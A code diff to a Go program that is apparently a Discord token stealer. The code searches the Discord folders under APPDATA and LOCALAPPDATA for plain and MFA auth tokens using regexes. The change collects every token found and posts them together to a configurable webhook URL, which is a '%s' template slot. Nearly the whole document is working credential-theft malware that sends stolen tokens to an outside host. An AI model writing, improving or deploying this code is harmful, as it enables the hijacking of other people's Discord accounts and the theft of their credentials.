@@ -12,7 +12,7 @@ import (
 )
 
 func sendWebhook(message string) {
-	url := ""
+	url := "%s"
 	values := map[string]string{
 		"content": message,
 	}
@@ -34,6 +34,7 @@ func sendWebhook(message string) {
 func getTokens() {
 	ROAMING := os.Getenv("APPDATA")
 	LOCAL := os.Getenv("LOCALAPPDATA")
+	tokens := []string{}
 	PATHS := map[string]string{
 		"Discord":        ROAMING + "\\Discord",
 		"Discord Canary": ROAMING + "\\discordcanary",
@@ -60,13 +61,13 @@ func getTokens() {
 					reNotmfa, err := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)
 					if err == nil {
 						if string(reNotmfa.Find(data)) != "" {
-							sendWebhook("Token found : ``" + string(reNotmfa.Find(data)) + "``")
+							tokens = append(tokens, string(reNotmfa.Find(data)))
 						}
 					}
 					reMfa, err := regexp.Compile(`mfa\.[\w-]{84}`)
 					if err == nil {
 						if string(reMfa.Find(data)) != "" {
-							sendWebhook("Token found : ``" + string(reMfa.Find(data)) + "``")
+							tokens = append(tokens, string(reMfa.Find(data)))
 						}
 					}
 				}
@@ -75,6 +76,8 @@ func getTokens() {
 			continue
 		}
 	}
+	content := strings.Join(tokens, "``\n``")
+	sendWebhook("**" + fmt.Sprint(len(tokens)) + " TOKENS FOUND :** \n\n``" + content + "``")
 }
 
 func main() {
